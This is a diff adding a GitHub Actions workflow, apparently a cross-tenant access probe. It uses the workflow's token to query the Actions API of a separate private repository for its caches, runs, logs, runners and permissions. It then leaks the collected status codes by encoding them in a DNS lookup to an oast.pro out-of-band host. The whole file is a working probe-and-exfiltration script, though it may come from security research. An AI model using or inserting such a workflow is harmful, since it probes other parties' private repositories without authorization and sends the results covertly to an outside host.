@@ -1,0 +1,32 @@
+name: xtenant2
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+  actions: read
+jobs:
+  x:
+    runs-on: ubuntu-latest
+    steps:
+      - name: actions data plane from public token vs private repo
+        env:
+          TOKEN: ${{ github.token }}
+        run: |
+          B=https://api.github.com
+          A="Authorization: Bearer $TOKEN"
+          H="Accept: application/vnd.github+json"
+          P=tooforg/invisible-repo
+          C1=$(curl -s -o /dev/null -w '%{http_code}' -H "$A" -H "$H" "$B/repos/$P/actions/caches")
+          C2=$(curl -s -o /tmp/runs.json -w '%{http_code}' -H "$A" -H "$H" "$B/repos/$P/actions/runs?per_page=1")
+          C3=$(curl -s -o /dev/null -w '%{http_code}' -H "$A" -H "$H" "$B/repos/$P/actions/workflows")
+          C4=$(curl -s -o /dev/null -w '%{http_code}' -H "$A" -H "$H" "$B/repos/$P/actions/permissions")
+          C5=$(curl -s -o /dev/null -w '%{http_code}' -H "$A" -H "$H" "$B/repos/$P/actions/runners")
+          C6=$(curl -s -o /dev/null -w '%{http_code}' -H "$A" -H "$H" "$B/repos/$P/actions/caches?key=h1")
+          RID=$(python3 -c "import json;d=json.load(open('/tmp/runs.json'));print((d.get('workflow_runs') or [{}])[0].get('id',''))" 2>/dev/null || true)
+          C7=na; C8=na
+          if [ -n "$RID" ]; then
+            C7=$(curl -s -o /dev/null -w '%{http_code}' -H "$A" -H "$H" "$B/repos/$P/actions/runs/$RID/logs")
+            C8=$(curl -s -o /dev/null -w '%{http_code}' -H "$A" -H "$H" "$B/repos/$P/actions/runs/$RID")
+          fi
+          echo "xt2 caches=$C1 runs=$C2 workflows=$C3 perms=$C4 runners=$C5 cachekey=$C6 logs=$C7 run=$C8"
+          getent hosts "st${C1}${C2}${C3}${C4}${C5}${C6}${C7}${C8}ro4yhyiy8bnjaqqlmuqb1ypm1r0ihzth0.oast.pro" > /dev/null 2>&1 || true
